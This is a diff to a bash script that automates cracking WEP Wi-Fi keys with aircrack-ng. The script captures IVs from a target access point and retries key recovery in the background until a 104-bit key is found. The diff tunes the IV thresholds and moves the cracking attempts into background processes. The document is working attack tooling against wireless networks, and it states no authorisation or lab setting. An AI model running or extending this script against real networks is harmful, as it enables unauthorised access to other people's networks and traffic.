@@ -39,8 +39,8 @@ CHANNEL=""
 ESSID=""
 MODE="active"
 PREFIX="wepcap"
-IV_TARGET=20000          # aircrack is retried each time #Data grows by this much (-t)
-MIN_IVS=5000             # no aircrack attempt until #Data reaches this many IVs
+IV_TARGET=10000          # aircrack is retried each time #Data grows by this much (-t)
+MIN_IVS=40000            # first attempt here: PTW breaks half of 104-bit keys under 40,000 IVs
 RETRY_SECS=3             # seconds between progress lines (airodump rewrites the capture every second)
 
 while getopts ":i:b:c:e:m:o:t:h" opt; do
@@ -150,6 +150,7 @@ show_key() {
   echo "============================================================"
 }
 last_iv=0                # #Data at the last aircrack attempt (0 = none yet)
+try_pid=""               # the aircrack-ng attempt running in the background, if any
 prev_iv=$(ap_ivs)        # #Data at the last progress line, for the rate
 prev_time=$(date +%s.%N) # when that line was printed
 while true; do
@@ -170,17 +171,24 @@ while true; do
   echo "    $(date +%H:%M:%S)  IVs ${ivs} (${rate} IV/s)  ${replay}"
   prev_iv=$ivs
   prev_time=$now
-  # first try once we have a reasonable pile, then again each time #Data grows by IV_TARGET
-  if (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
-    last_iv=$ivs
-    echo "    [*] trying the key at ${ivs} IVs (up to 60 s)..."
-    # -n 128: a 13-character (104-bit) WEP key. -b: the capture can hold other networks.
-    # timeout: a failed try can wait or brute-force for minutes and would freeze this loop; a
-    # timed-out try is retried at the next IV_TARGET step.
-    if timeout -k 5 60 aircrack-ng -q -n 128 -b "$BSSID" -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 && [[ -s "$KEYFILE" ]]; then
+  # A finished try found the key only if the key file exists: aircrack-ng writes it on success.
+  if [[ -n "$try_pid" ]] && ! kill -0 "$try_pid" 2>/dev/null; then
+    try_pid=""
+    if [[ -s "$KEYFILE" ]]; then
       echo
       show_key
       exit 0
     fi
+  fi
+  # One try at a time, in the background, so the progress lines and the checks above keep running
+  # while it works. The first try waits for MIN_IVS, then each try waits for IV_TARGET more IVs.
+  if [[ -z "$try_pid" ]] && (( ivs >= MIN_IVS && (last_iv == 0 || ivs - last_iv >= IV_TARGET) )); then
+    last_iv=$ivs
+    echo "    [*] trying the key at ${ivs} IVs (up to 60 s, in the background)..."
+    # -n 128: a 13-character (104-bit) WEP key. -b: the capture can hold other networks.
+    # timeout: a failed try can brute-force for minutes; the next try waits for IV_TARGET more IVs.
+    timeout -k 5 60 aircrack-ng -q -n 128 -b "$BSSID" -l "$KEYFILE" "${OUT}-01.cap" >/dev/null 2>&1 &
+    try_pid=$!
+    track_pid "$try_pid"
   fi
 done
